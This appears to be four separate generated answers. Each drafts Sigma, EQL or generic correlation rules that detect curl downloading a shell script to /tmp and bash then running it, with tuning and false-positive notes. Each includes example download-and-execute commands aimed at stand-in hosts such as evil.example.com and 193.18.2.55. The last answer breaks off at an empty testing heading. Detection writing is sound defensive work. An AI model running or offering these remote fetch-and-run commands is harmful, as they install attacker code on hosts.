text:
Below is a platform-agnostic **Sigma correlation rule** assuming Linux + Sysmon.  
It detects the classic pattern:

> `curl` downloads a Bash script to `/tmp`, and then `bash` executes a script from `/tmp`.

Use this as a **temporal correlation** across two detection events.

```yaml
- id: 7575c77d-1117-4e36-983a-133313368f43
  title: Curl Downloads Bash Script to /tmp
  description: >
    Detects curl downloading or writing a Bash script to /tmp. This can be
    observed through curl process command lines using output redirection or
    through Sysmon file-write events.
  status: experimental
  author: Detection Engineer
  date: 2026-05-21
  references:
    - https://attack.mitre.org/techniques/T1105/
    - https://attack.mitre.org/techniques/T1059/004/
  tags:
    - attack.execution
    - attack.command_and_control
    - attack.t1105
    - attack.t1059.004
  logsource:
    product: linux
    service: sysmon
    category: any
  detection:
    selection_curl_process:
      EventID: 1
      Image|endswith:
        - /usr/bin/curl
        - /bin/curl
        - /usr/local/bin/curl
    curl_url:
      CommandLine|contains:
        - http://
        - https://
        - ftp://
    curl_to_tmp:
      CommandLine|contains:
        - '-o /tmp/'
        - '-o/tmp/'
        - '--output /tmp/'
        - '--output=/tmp/'
        - '> /tmp/'
        - '>> /tmp/'
    curl_script_ext:
      CommandLine|re: '(?i)\.(sh|bash)\b'

    selection_curl_write:
      EventID: 11
      Image|endswith:
        - /usr/bin/curl
        - /bin/curl
        - /usr/local/bin/curl
      TargetFilename|startswith:
        - /tmp/
      TargetFilename|endswith:
        - .sh
        - .bash

    condition: (selection_curl_process and curl_url and curl_to_tmp and curl_script_ext) or selection_curl_write

- id: 5178b8f9-2e3c-472b-822f-118707722e35
  title: Bash Executes Script From /tmp
  description: >
    Detects bash executing a script path located under /tmp.
  status: experimental
  author: Detection Engineer
  date: 2026-05-21
  references:
    - https://attack.mitre.org/techniques/T1059/004/
  tags:
    - attack.execution
    - attack.t1059.004
  logsource:
    product: linux
    service: sysmon
    category: process_creation
  detection:
    selection_image:
      Image|endswith:
        - /bin/bash
        - /usr/bin/bash
    selection_tmp_path:
      CommandLine|contains:
        - /tmp/
    selection_script_ext:
      CommandLine|contains:
        - .sh
        - .bash

    filter_syntax_check:
      CommandLine|contains|all:
        - 'bash -n'
        - '/tmp/'

    condition: selection_image and selection_tmp_path and selection_script_ext and not filter_syntax_check

- id: 971a8f1c-6138-49f1-8713-3636e617b4f9
  title: Curl Download to /tmp Followed by Bash Execution
  description: >
    Correlates a curl download of a Bash script to /tmp followed by a bash
    process executing a script from /tmp. This detects common malware delivery
    patterns using curl download-and-execute techniques.
  status: experimental
  author: Detection Engineer
  date: 2026-05-21
  references:
    - https://attack.mitre.org/techniques/T1105/
    - https://attack.mitre.org/techniques/T1059/004/
  tags:
    - attack.execution
    - attack.command_and_control
    - attack.t1105
    - attack.t1059.004
  type: correlation
  correlation:
    type: temporal
    rules:
      - 7575c77d-1117-4e36-983a-133313368f43
      - 5178b8f9-2e3c-472b-822f-118707722e35
    timespan: 15m
    group-by:
      - host_name
```

## Tuning notes

### 1. Field mapping
Depending on your SIEM or schema, these fields may need to be translated:

| Sigma field | Common equivalents |
|---|---|
| `Image` | `process.name`, `process.exe`, `process.file.name` |
| `CommandLine` | `process.command_line`, `process.args`, `process.cmdline` |
| `TargetFilename` | `file.path`, `file.name`, `target_filename` |
| `host_name` | `host.name`, `computer`, `hostname`, `event.hostname` |

### 2. Higher fidelity: correlate by parent process
For lower noise, group by `host_name` and `parent_process_guid`, if your telemetry exposes it:

```yaml
group-by:
  - host_name
  - parent_process_guid
```

This better captures malicious shell one-liners such as:

```bash
curl http://malicious.example/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh
```

### 3. Coverage: add `/var/tmp`
Many real-world malware variants also use `/var/tmp`. If you want broader coverage, add `/var/tmp/` to both `/tmp/` conditions.

Example additions:

```yaml
TargetFilename|startswith:
  - /tmp/
  - /var/tmp/
```

```yaml
CommandLine|contains:
  - /tmp/
  - /var/tmp/
```

### 4. Broader execution coverage
The rule above specifically detects `bash` execution. Many Linux malware variants may execute scripts via:

```bash
sh /tmp/x.sh
dash /tmp/x.sh
/bin/sh /tmp/x.sh
```

To broaden coverage, extend the execution rule with:

```yaml
Image|endswith:
  - /bin/bash
  - /usr/bin/bash
  - /bin/sh
  - /usr/bin/sh
  - /usr/bin/dash
```

### 5. False-positive candidates
Expected false positives may include:

- Software installers
- Patch/update agents
- Ansible, Puppet, Chef, or remote script automation
- Development tools downloading helper scripts
- CI/CD runners

For production use, add environment-specific allow filters based on:

- Parent process
- Known legitimate scripts
- Allowlisted package managers
- Allowlisted command-line arguments
- Trusted network destinations

### Example malicious behavior detected

```bash
curl -s http://evil.example.com/payload.sh -o /tmp/update.sh && bash /tmp/update.sh
```

```bash
curl https://cdn.evil.example/x.sh > /tmp/x.sh; /bin/bash /tmp/x.sh
```

```bash
bash -c "curl http://evil.example/loader.sh -o /tmp/loader.sh && bash /tmp/loader.sh"
```

text:
Below is a detection rule that uses **process execution events** to find the classic:

```text
curl ... --output/-o >/tmp/... .sh  ->  bash /tmp/... .sh
```

The recommended way to detect this is with a **sequence/correlation rule**, because a single process event is usually not enough.

---

## Recommended Rule: EQL Sequence

Use this in EDR platforms that support EQL, such as CrowdStrike/Endpoint-style sequence rules. Adjust the event type field to match your telemetry.

```eql
sequence by host.id with maxspan=5m
  [process where subtype == ? and
    (process.name == "curl" or process.name == "curl.exe") and
    (
      process.args =~ "(?i)(-o|--output|--output-dir)[=\\s]+/tmp/[^\\s]*\\.(sh|bash)"
      or process.args =~ "(?i)(1?>|>>)[=\\s]*/tmp/[^\\s]*\\.(sh|bash)"
      or (
        process.args =~ "(?i)(-o|--output|--output-dir)[=\\s]+/tmp/"
        and process.args =~ "(?i)(https?|ftps?|sftp)://[^\\s]*\\.(sh|bash)"
      )
    )
  ]
  [process where subtype == ? and
    (
      process.name == "bash"
      or process.name == "bash.exe"
      or process.name == "sh"
      or process.name == "sh.exe"
    ) and
    process.args =~ "(?i)(^|\\s)/tmp/[^\\s]*\\.(sh|bash)(\\s|$)"
  ]
```

### What this detects

This looks for:

1. A `curl` or `curl.exe` process that writes something with a `.sh` or `.bash` extension into `/tmp`, using patterns such as:
   - `curl -o /tmp/x.sh ...`
   - `curl --output /tmp/x.sh ...`
   - `curl ... > /tmp/x.sh`
   - `curl -o /tmp/ ... https://host/x.sh`

2. Followed within **5 minutes** by:
   - `bash /tmp/x.sh`
   - `bash /tmp/x.bash`
   - `sh /tmp/x.sh`
   - `bash.exe /tmp/x.sh`

Correlation is done by `host.id`, so both events must occur on the same host.

---

## Sigma Equivalent: Two Sub-Rules Plus Correlation

If your environment uses Sigma, deploy the two process-creation rules below, then configure a correlation rule over **5 minutes by host**.

### Sub-rule 1: curl writes shell script to /tmp

```yaml
title: Curl Download Shell Script To /tmp
id: 11111111-1111-1111-1111-111111111111
status: experimental
description: Detects curl downloading a bash script into /tmp using output redirection or -o/--output.
tags:
  - attack.execution
  - attack.t1059.004
  - attack.command_and_control
  - attack.t1105

logsource:
  category: process_creation
  product: linux

detection:
  selection_image:
    Image|endswith:
      - '/curl'
      - '/usr/bin/curl'
      - '/bin/curl'

  selection_tmp:
    CommandLine|contains|all:
      - '/tmp/'

  selection_output:
    CommandLine|contains:
      - '-o '
      - '-o='
      - '--output '
      - '--output='
      - '--output-dir'
      - '> /tmp/'
      - '>/tmp/'

  selection_script:
    CommandLine|contains:
      - '.sh'
      - '.bash'

  condition: selection_image and selection_tmp and selection_output and selection_script

falsepositives:
  - Legitimate software installers
  - CI/CD pipelines staging scripts in /tmp
  - Sysadmins running curl to download scripts to /tmp

level: medium
```

For Windows, change:

```yaml
logsource:
  category: process_creation
  product: windows
  service: sysmon
```

and use:

```yaml
  selection_image:
    Image|endswith:
      - '\curl.exe'
      - '\usr\bin\curl'
      - '\bin\curl'
```

---

### Sub-rule 2: bash executes script from /tmp

```yaml
title: Bash Executes Shell Script From /tmp
id: 22222222-2222-2222-2222-222222222222
status: experimental
description: Detects bash or sh executing a script from /tmp.
tags:
  - attack.execution
  - attack.t1059.004

logsource:
  category: process_creation
  product: linux

detection:
  selection_image:
    Image|endswith:
      - '/bash'
      - '/usr/bin/bash'
      - '/bin/bash'
      - '/sh'
      - '/usr/bin/sh'
      - '/bin/sh'

  selection_tmp:
    CommandLine|contains|all:
      - '/tmp/'

  selection_script:
    CommandLine|contains:
      - '.sh'
      - '.bash'

  condition: selection_image and selection_tmp and selection_script

falsepositives:
  - Package managers
  - Installation scripts
  - Developer tools
  - CI/CD agents

level: medium
```

For Windows, use:

```yaml
  selection_image:
    Image|endswith:
      - '\bash.exe'
      - '\sh.exe'
```

---

### Correlation Configuration

Once both sub-rules are enabled, configure a correlation rule similar to this conceptually:

```text
Rule 1: Curl Download Shell Script To /tmp
Rule 2: Bash Executes Shell Script From /tmp

Correlation type: timeline_event or temporal sequence
Group by: host.name or host.id
Time window: 5 minutes
Condition: Rule 1 followed by Rule 2
```

If your Sigma platform supports correlation syntax, the block may look similar to:

```yaml
correlation:
  type: timeline_event
  rules:
    - 11111111-1111-1111-1111-111111111111
    - 22222222-2222-2222-2222-222222222222
  timeframe: 5m
  group_fields:
    - host.name
```

Some Sigma versions may require slight syntax variations. If correlation is not supported, configure the sequence/correlation in your SIEM or EDR rule engine using the two rule IDs above.

---

## Generic Detection Logic

If your platform does not support EQL or Sigma, implement this logic:

```text
EVENT 1:
  process.name in [curl, curl.exe]
  AND command_line contains one of:
    -o
    --output
    --output-dir
    >
    >>
  AND command_line contains:
    /tmp/
  AND command_line contains:
    .sh or .bash

EVENT 2:
  process.name in [bash, bash.exe, sh, sh.exe]
  AND command_line contains:
    /tmp/
  AND command_line contains:
    .sh or .bash

CORRELATION:
  EVENT 1 followed by EVENT 2
  Same host.id
  Within 5 minutes
```

---

## Tuning and Deployment Notes

### Event source

Use **Process Create** or **Process Execve** events.

Examples:

- Windows Sysmon: Event ID 1
- Linux auditd: `execve`
- Elastic ECS: `event.action = process_start`
- CrowdStrike: process creation events

### Path expansion

The rule focuses on `/tmp` because that matches the stated objective. For broader coverage, you can replace `/tmp` with:

```text
/tmp|/var/tmp|/dev/shm
```

For example, the execution condition can become:

```text
command_line contains /tmp/ OR /var/tmp/ OR /dev/shm/
```

Be careful: `/dev/shm` is often abused for fileless or staging behavior.

### Optional: file-write coverage

If your EDR exposes the target file path for `curl`, add an alternative condition to the `curl` event:

```eql
process.target.file.path =~ "^/tmp/[^\\s]*\\.(sh|bash)$"
```

That catches downloads where the command line does not clearly show `/tmp/...sh`.

### Optional: `curl | bash`

Your stated objective is `curl` download to `/tmp` followed by `bash`. A separate but related rule can catch the classic:

```text
curl ... | bash
```

Example EQL variant:

```eql
process where subtype == ? and
  (
    (process.name == "bash" or process.name == "sh") and
    process.args =~ "(?i)curl.*\\|\\s*(bash|sh)"
  )
```

This is not required for the `/tmp` pattern, but it is often useful alongside the main rule.

### False positives

Expect benign hits from:

- Software installers
- Linux package managers
- Docker build processes
- CI/CD runners
- Patch management tools
- System administration scripts

Allowlist only when you have a known good parent process, command line, or script hash. For example, legitimate patterns may include:

```text
apt install ...
curl -o /tmp/install.sh https://company.example/install.sh
```

If that download-and-execute is authorized, baseline it as expected behavior or restrict detection to servers/containers where it is abnormal.

### Suggested severity

- **Medium** if the destination path is `/tmp` only.
- **High** if `/var/tmp`, `/dev/shm`, or suspicious remote URLs are also included.
- **Critical** if combined with persistence, network connection to unusual hosts, or child processes writing further payloads.

---

## Expected Test Behavior

A benign test should trigger the rule:

```bash
curl -o /tmp/detection_test.sh --header "X-Test: 1" https://example.invalid/detection_test.sh
bash /tmp/detection_test.sh
```

A command like this may miss if the file lacks a `.sh` or `.bash` extension:

```bash
curl -o /tmp/payload https://example.invalid/payload
bash /tmp/payload
```

For broader coverage, tune the extension condition to accept scripts with no extension or common script names.

text:
Below is a **correlation-style detection rule** for the described behavior. It is written to be **language-agnostic first**, with a Sigma-style implementation sketch afterward.

---

## Detection Rule

```yaml
name: Malicious Download-and-Execute via curl to /tmp Script Followed by bash Execution
description: >
  Detects a curl process downloading or writing a Bash/Shell script to /tmp
  followed by execution of that script by bash/sh on the same host.
  This pattern is commonly associated with malware download-and-execute delivery.

type: correlation
data_source: process_creation

events:
  download_event:
    conditions:
      process.name: curl
      process.command_line:
        regex: '\bcurl\b.*(?:(?:--output|-o)[\s=]*|>\s*)(/tmp/[^\s]+\.sh)'
    extract:
      target_path: /tmp/[^\s]+\.sh
    fields:
      - host.id
      - host.name
      - process.name
      - process.command_line
      - timestamp

  execution_event:
    conditions:
      process.name: [bash, sh]
      process.command_line:
        regex: '/tmp/[^\s]+\.sh'
    extract:
      target_path: /tmp/[^\s]+\.sh
    fields:
      - host.id
      - host.name
      - process.name
      - process.command_line
      - timestamp

correlation:
  same_host: true
  same_target_path: true
  order:
    - download_event
    - execution_event
  time_window:
    min_gap: 0
    max_gap: 5 minutes
    unit: seconds
  severity: high

false_positive_filters:
  - "Trusted software updater or install script path"
  - "Signed or approved maintenance process"
  - "Admin-authorized download-and-execute job"
```

---

## Rule Logic in Plain English

Generate an alert when:

1. A `curl` process is observed.
2. That `curl` process command line contains an operation that writes a `.sh` file into `/tmp`, such as:
   - `curl -o /tmp/malware.sh`
   - `curl --output /tmp/malware.sh`
   - `curl --output=/tmp/malware.sh`
   - `curl https://... /tmp/malware.sh > /tmp/malware.sh`
3. After that, a `bash` or `sh` process is observed on the same host.
4. The execution command line contains the same `/tmp/*.sh` path that was downloaded.
5. The execution happens shortly after the download, typically within **5 minutes**.

---

## MITRE ATT&CK Mapping

```text
T1105 - Ingress Tool Transfer
T1059.004 - Command and Scripting Interpreter: Unix Shell
T1071.001 - Application Layer Protocol: Web Protocols
```

---

## Sigma-Style Implementation

This is a translation of the rule into a Sigma-like format. In many SIEMs, this will require **correlation support** and **field extraction** for the `/tmp/*.sh` target path.

```yaml
title: Malicious Download-and-Execute via curl to /tmp Script Followed by bash
description: >
  Detects when curl downloads or writes a shell script to /tmp and the same
  script is executed by bash/sh shortly afterward.

status: experimental
author: security-detection-engineering
date: 2026-01-01
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/

tags:
  - attack.command_and_scripting_interpreter
  - attack.t1059.004
  - attack.ingress_tool_transfer
  - attack.t1105

logsource:
  product: linux
  category: process_creation

detection:
  selection_download:
    Image|endswith: '/curl'
    CommandLine|re: '\bcurl\b.*(?:(?:--output|-o)[\s=]*|>\s*)(/tmp/[^\s]+\.sh)'

  selection_execution:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|re: '/tmp/[^\s]+\.sh'

  target_path_extraction_download:
    field: CommandLine
    extraction: '/tmp/[^\s]+\.sh'

  target_path_extraction_execution:
    field: CommandLine
    extraction: '/tmp/[^\s]+\.sh'

  filter_benign:
    CommandLine|contains:
      - '/tmp/known-legitimate-script.sh'
      - '/tmp/update.sh'
      - '/tmp/install.sh'

  condition: |
    correlation:
      type: event_sequence
      events:
        - selection_download
        - selection_execution
      group_by:
        - host.name
        - target_path
      order: chronological
      time_window: 5 minutes
      same_target_path: true
      same_host: true
```

---

## Practical Variant for Two Separate Sigma Rules

If your Sigma implementation does not directly support complex correlation, you can implement the rule as **two process-creation rules** and correlate them in the SIEM.

### Rule 1: curl Writes Shell Script to /tmp

```yaml
title: curl Downloads Shell Script to /tmp
description: >
  Detects curl writing or downloading a shell script to /tmp.

status: experimental
logsource:
  product: linux
  category: process_creation

detection:
  selection:
    Image|endswith: '/curl'
    CommandLine|re: '\bcurl\b.*(?:(?:--output|-o)[\s=]*|>\s*)(/tmp/[^\s]+\.sh)'

  condition: selection
```

### Rule 2: bash Executes Shell Script from /tmp

```yaml
title: bash Executes Shell Script from /tmp
description: >
  Detects bash or sh executing a shell script located in /tmp.

status: experimental
logsource:
  product: linux
  category: process_creation

detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|re: '/tmp/[^\s]+\.sh'

  condition: selection
```

### Correlation Condition

```text
Alert if:
- Rule 1 fired on host H with target path P
- Rule 2 fired on host H with the same target path P
- Rule 2 event occurred after Rule 1 event
- Time delta is 0 to 5 minutes
```

---

## More Conservative Variant

The strict version above correlates by both **host** and **script path**. If your logging does not preserve or expose full command lines cleanly, you can reduce precision and correlate only by host:

```text
curl process with command line containing "/tmp/" and ".sh"
followed by
bash/sh process with command line containing "/tmp/" and ".sh"
within 15 minutes
on the same host
```

That is easier to implement but produces more false positives because it does not verify that the same script was downloaded and executed.

---

## Example Events That Should Match

```bash
curl -o /tmp/update.sh http://192.0.2.10/update.sh
bash /tmp/update.sh
```

```bash
curl --output /tmp/installer.sh http://malicious.example/installer.sh
sh /tmp/installer.sh
```

```bash
curl https://example.com/payload.sh -o /tmp/payload.sh
/usr/bin/bash /tmp/payload.sh
```

```bash
curl http://192.0.2.10/malware.sh > /tmp/malware.sh
bash /tmp/malware.sh
```

---

## Recommended Tuning Notes

1. **Correlate by file path if possible.**  
   Matching the exact `/tmp/*.sh` file is much more accurate than matching only host behavior.

2. **Use a short time window.**  
   Start with **5 minutes**, and extend to **15 minutes** only if needed.

3. **Exclude legitimate automation.**  
   Software update agents, patch installers, and admin deployment tools commonly use download-and-execute patterns. Use path allowlists, signature validation, or process-parent allowlists where supported.

4. **Watch for alternate temp directories.**  
   Malware may write to `/var/tmp`, `/dev/shm`, `/usr/tmp`, or user-writable directories. A broader version can replace `/tmp/` with a variable temp path, but this will increase false positives.

5. **Consider `wget` as a related variant.**  
   If you also want coverage for `wget`, modify the download condition to include:
   ```text
   process.name in [curl, wget]
   ```

- Any SIEM/EDR with `process_creation` events containing `Image`, `CommandLine`, and optionally `ParentImage`

The rule detects the classic Linux malware pattern:

```text
curl downloads/writes a script into /tmp
  ↓
bash executes the script from /tmp
```

---

## Sigma rule

```yaml
title: Linux Malicious Download-and-Execute via curl to /tmp Followed by bash
id: 17b75d0a-9c2a-4d6c-a1b3-9a7f3f6c5d21
status: experimental
description: >
  Detects a curl process downloading or writing a script to /tmp, followed by a
  bash or shell process executing a script from /tmp. This is a common Linux
  malware delivery pattern involving download-and-execute of bash payloads.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
author: Detection Engineering
tags:
  - attack.execution
  - attack.command_and_control
  - attack.defense_evasion
  - attack.t1105
  - attack.t1059.004
logsource:
  category: process_creation
  product: linux
detection:
  curl_download:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - 'http'
      - '/tmp/'
    CommandLine|re: "(?i)(?:-o[=\\s]|--output[=\\s]|1>\\s*|2>\\s*|>\\s*)[\"']?/tmp/[\\w./-]+"

  bash_execution:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/zsh'
      - '/ksh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  filter_trusted_tool:
    ParentImage|endswith:
      - '/usr/bin/apt'
      - '/usr/bin/apt-get'
      - '/usr/bin/dpkg'
      - '/usr/bin/dnf'
      - '/usr/bin/yum'
      - '/usr/bin/rpm'
      - '/usr/bin/snap'
      - '/usr/bin/dockerd'
      - '/usr/bin/buildah'
      - '/usr/bin/podman'

  condition: curl_download and bash_execution and not filter_trusted_tool
  timeframe: 10m
level: high
falsepositives:
  - Legitimate software installers downloading scripts into /tmp
  - Build pipelines and CI/CD agents fetching shell scripts
  - Container or Kubernetes setup scripts using curl and bash
  - Administrative tasks involving legitimate download-and-execute workflows
```

---

## How this rule works

### `curl_download`

Matches `curl` activity that:

1. Uses `curl`
2. Contains an HTTP/HTTPS reference
3. Contains `/tmp/`
4. Shows file writing into `/tmp` using common `curl` output methods such as:

```text
-o /tmp/payload.sh
-o=/tmp/payload.sh
--output /tmp/payload.sh
--output=/tmp/payload.sh
> /tmp/payload.sh
1> /tmp/payload.sh
2> /tmp/payload.sh
```

The regex attempts to capture common output-redirection and `curl` output-flag patterns.

---

### `bash_execution`

Matches a shell executing a file from `/tmp`.

Examples that should trigger:

```text
bash /tmp/payload.sh
sh /tmp/payload.sh
bash -c /tmp/payload.sh
bash /tmp/install.sh
```

The `.sh` filter is included to increase fidelity for “bash script” execution. If you want to broaden detection, remove `.sh` from the `CommandLine|contains|all` list and match only `/tmp/`, but expect more false positives.

---

### `timeframe: 10m`

This attempts to correlate the `curl` event and the `bash` execution event within 10 minutes.

Depending on your Sigma backend, temporal correlation may be implemented differently. If your platform does not support `timeframe`, deploy the two conditions as separate rules and correlate them in your SIEM/EDR.

---

## Improved correlation using the file path

The above rule correlates by host within a time window. For higher fidelity, correlate using the exact `/tmp` file path when possible.

For example:

```text
curl downloads: /tmp/a7f3x.sh
bash executes: /tmp/a7f3x.sh
```

If your platform supports regex capture or correlation rules, use fields such as:

```text
Host.name
User.name
Correlated_file_path
```

Conceptually:

```text
Event 1:
  Image = /usr/bin/curl
  CommandLine contains:
    http(s)://
    -o /tmp/<filename>.sh
    or --output /tmp/<filename>.sh
    or > /tmp/<filename>.sh

Event 2:
  Image = /usr/bin/bash
  CommandLine contains:
    /tmp/<filename>.sh
```

The key point is to match the same temporary file name, not just any `curl` followed by any `bash`.

---

## Optional higher-fidelity rule using file creation events

If your environment also provides file-creation or file-write telemetry, this is stronger than command-line-only detection.

```yaml
title: Linux Malicious Download-and-Execute via curl File Write to /tmp
id: 3f89c82f-11a9-4c33-991b-99f79298f003
status: experimental
description: >
  Detects curl writing a script file into /tmp followed by bash executing that
  script from /tmp. Uses file-create telemetry when available.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
logsource:
  category: file_event
  product: linux
detection:
  curl_file_write:
    Image|endswith:
      - '/curl'
    TargetFilename|startswith:
      - '/tmp/'
    TargetFilename|contains:
      - '.sh'

  bash_execution:
    category: process_creation
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  condition: curl_file_write and bash_execution
  timeframe: 10m
level: high
```

If your EDR supports file magic or file type, add:

```yaml
FileMagic:
  contains:
    - 'application/x-shellscript'
    - 'text/x-shellscript'
```

This can help distinguish real bash scripts from arbitrary files written into `/tmp`.

## Detection logic summary

A good version of this rule should alert when:

1. `curl` is used to download or write a file into `/tmp`.
2. The command references an HTTP or HTTPS URL.
3. The write target is under `/tmp`.
4. A shell such as `bash`, `sh`, `dash`, `zsh`, or `ksh` later executes a file under `/tmp`.
5. The executed file appears to be a script, commonly ending in `.sh`.
6. The events occur within a short timeframe.
7. The activity is not associated with known package managers or trusted build tooling.

A malicious example that should be caught:

```bash
curl -o /tmp/x.sh http://193.18.2.55/malware.sh
bash /tmp/x.sh
```

Another example:

```bash
curl http://193.18.2.55/malware.sh > /tmp/x.sh
bash /tmp/x.sh
```

Another example:

```bash
bash -c 'curl http://193.18.2.55/malware.sh -o /tmp/x.sh && bash /tmp/x.sh'
```

---

## Tuning guidance

Before deploying, tune the rule against your environment.

### Common false-positive sources

- Docker build environments
- Kubernetes node setup
- Ansible or Salt agents
- `pip`, `composer`, `npm`, `yarn`, `go`, `rustup` installers
- Cloud-init scripts
- Package manager bootstrap tools
- CI/CD pipelines downloading legitimate scripts

### Reduce noise

Add exclusions for:

```yaml
ParentImage|endswith:
  - '/usr/bin/apt-get'
  - '/usr/bin/dnf'
  - '/usr/bin/yum'
  - '/usr/bin/podman'
  - '/usr/bin/dockerd'
```

If you have command-line logging, consider excluding known trusted URLs, but be careful because malware can abuse legitimate CDN and code-hosting platforms.

### Increase fidelity

To reduce false positives further, correlate on the exact file path rather than only time:

```text
curl output: /tmp/<random>.sh
bash execution: /tmp/<random>.sh
```

To reduce false negatives, broaden the bash execution condition:

```yaml
bash_execution:
  Image|endswith:
    - '/bash'
    - '/sh'
  CommandLine|contains:
    - '/tmp/'
```

This will catch scripts without a `.sh` extension but may produce more noise.

text:
Below is a detection rule for Linux process-creation telemetry that detects the classic pattern:

```bash
curl http://evil.example/script.sh -o /tmp/script.sh
bash /tmp/script.sh
```

The rule correlates:

1. `curl` writing a `.sh` file under `/tmp`
2. followed by `bash` executing that same `/tmp` script path  
3. on the same host within a short time window.

---

## Sigma-style / SIEM correlation rule

```yaml
# Detection rule:
# Malicious curl download of a bash script to /tmp followed by bash execution.
#
# This is written as a portable Sigma/SIEM correlation rule.
# Field names may need to be mapped to your EDR/auditd/Sysmon/EDR data source.
# If your Sigma tool does not support correlation blocks, deploy the two
# component queries and correlate them manually using Host + ScriptPath.

title: Malicious Curl Download To /tmp Followed By Bash Execution
description: >
  Detects curl writing a bash script into /tmp and later bash executing the
  same script path, consistent with download-and-execute malware delivery.
author: Detection Engineering
status: experimental
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/

tags:
  - attack.execution
  - attack.command_and_scripting_interpreter
  - attack.ingress_tool_transfer
  - linux

logsource:
  product: linux
  service: process_creation

# Correlation settings:
#  - Same host
#  - Same normalized script path
#  - curl event must occur before bash event
#  - Window: 5 minutes
correlation:
  type: sequence
  fields:
    - Host.id
    - ScriptPath
  timespan: 5m
  rules:
    - curl_download_to_tmp_script
    - bash_execute_tmp_script
  condition:
    curl_download_to_tmp_script and bash_execute_tmp_script
    where:
      bash_event.Timestamp > curl_event.Timestamp
      and bash_event.Timestamp <= curl_event.Timestamp + 5m

rules:
  curl_download_to_tmp_script:
    description: >
      Detects curl downloading a script file to /tmp using -o or --output.
    detection:
      selection:
        Image|endswith:
          - '/curl'
        CommandLine|re: >
          (?i:curl)\b.*(?:-o|--output)(?:=|\s+)\"?(?<ScriptPath>\/tmp\/[^\s\"']+\.sh)
      url_present:
        CommandLine|re: >
          (?i)(?:https?|ftps?|file|sftp|scp|ldap|ldaps)://
      condition: selection and url_present

    # Field extraction required for correlation:
    # ScriptPath = /tmp/<filename>.sh
    fields:
      ScriptPath:
        field: CommandLine
        method: regex
        pattern: >
          (?i)(?:-o|--output)(?:=|\s+)\"?(?<path>\/tmp\/[^\s\"']+\.sh)
        group: path
        normalize: >
          strip surrounding quotes, collapse duplicate slashes,
          remove './', resolve obvious /tmp paths where possible.

  bash_execute_tmp_script:
    description: >
      Detects bash executing a script from /tmp.
    detection:
      selection:
        Image|endswith:
          - '/bash'
        CommandLine|re: >
          (?i:bash)\b.*?(?<ScriptPath>\/tmp\/[^\s\"']+\.sh)
      condition: selection

    # Field extraction required for correlation:
    # ScriptPath = /tmp/<filename>.sh
    fields:
      ScriptPath:
        field: CommandLine
        method: regex
        pattern: >
          (?i:bash)\b.*?(?<path>\/tmp\/[^\s\"']+\.sh)
        group: path
        normalize: >
          strip surrounding quotes, collapse duplicate slashes,
          remove './', resolve obvious /tmp paths where possible.

falsepositives:
  - Legitimate installer or provisioning scripts
  - Developer tooling bootstrap scripts
  - CI/CD agents downloading scripts to temporary directories
  - Package manager hooks or maintenance scripts using /tmp

level: high

# Recommended alert metadata:
#  - Host
#  - curl command line
#  - bash command line
#  - extracted script path
#  - curl process id
#  - bash process id
#  - time delta between curl and bash
```

---

## More platform-neutral rule form

```yaml
rule_name: Linux.Curl.Download.Tmp.Script.Bash.Execute

event_source:
  type: process_creation
  platform: linux

match:
  curl_download:
    process_image_end: '/curl'
    command_regex: '(?i)curl\b.*(?:-o|--output)(?:=|\s+)\"?(/tmp/[^\s\"']+\.sh)'
    url_regex: '(?i)(https?|ftp|file|sftp|scp)://'

  bash_execute:
    process_image_end: '/bash'
    command_regex: '(?i)bash\b.*?(/tmp/[^\s\"']+\.sh)'

correlation:
  key_fields:
    - host_id
    - script_path
  order:
    - curl_download
    - bash_execute
  window: 5m

severity: high

alert_fields:
  - host_id
  - script_path
  - curl_command_line
  - bash_command_line
  - curl_process_id
  - bash_process_id
  - time_delta
```

---

## Field mapping guidance

For common Linux sources, map the rule fields like this:

| Rule field | SysmonLinux | auditd | EDR examples |
|---|---|---|---|
| Process image | `Image` | `exe` | `path` |
| Command line | `CommandLine` | `cmd` / `execve` args | `command_line` |
| Host ID | `Computer` / `Host` | `host` | `host_id`, `device_id` |
| Event timestamp | `UtcTime` | `_time` | `timestamp`, `event_time` |
| PID | `ProcessGuid`, `ProcessId` | `pid` | `process_id`, `pid` |
| Parent PID | `ParentProcessGuid`, `ParentProcessId` | `ppid` | `parent_process_id`, `ppid` |

---

## Normalization requirements

To reduce false negatives and improve correlation accuracy, normalize the extracted `ScriptPath` before matching:

1. Remove surrounding single or double quotes.
2. Collapse duplicate slashes:

   ```text
   /tmp//script.sh -> /tmp/script.sh
   ```

3. Remove `./` and `../` path segments if possible:

   ```text
   /tmp/./script.sh -> /tmp/script.sh
   /tmp/../tmp/script.sh -> /tmp/script.sh
   ```

4. Prefer canonical absolute paths under `/tmp`.
5. Do not rely on process parent-child relationship alone, because this attacker pattern often uses an intermediate shell:

   ```bash
   sh -c 'curl -o /tmp/x.sh http://evil/x.sh && bash /tmp/x.sh'
   ```

   The `bash` process may not be a child of `curl`; it may be a child of `sh`. Therefore, correlate by host and extracted file path.

---

## Optional variant to catch `sh` execution

The core rule targets `bash`, but many attackers use `sh`. To broaden coverage, add an alternate execution rule:

```yaml
sh_execute_tmp_script:
  detection:
    selection:
      Image|endswith:
        - '/sh'
      CommandLine|re: >
        (?i:sh)\b.*?(?<ScriptPath>\/tmp\/[^\s\"']+\.sh)
    condition: selection

  fields:
    ScriptPath:
      field: CommandLine
      method: regex
      pattern: >
        (?i:sh)\b.*?(?<path>\/tmp\/[^\s\"']+\.sh)
      group: path
```

Correlation:

```yaml
curl_download_to_tmp_script -> sh_execute_tmp_script
```

This may increase false positives. A good implementation is:

- High-confidence alert: `curl` to `/tmp/*.sh` followed by `bash /tmp/*.sh`
- Medium-confidence alert: `curl` to `/tmp/*.sh` followed by `sh /tmp/*.sh`

---

## Example trigger command for testing

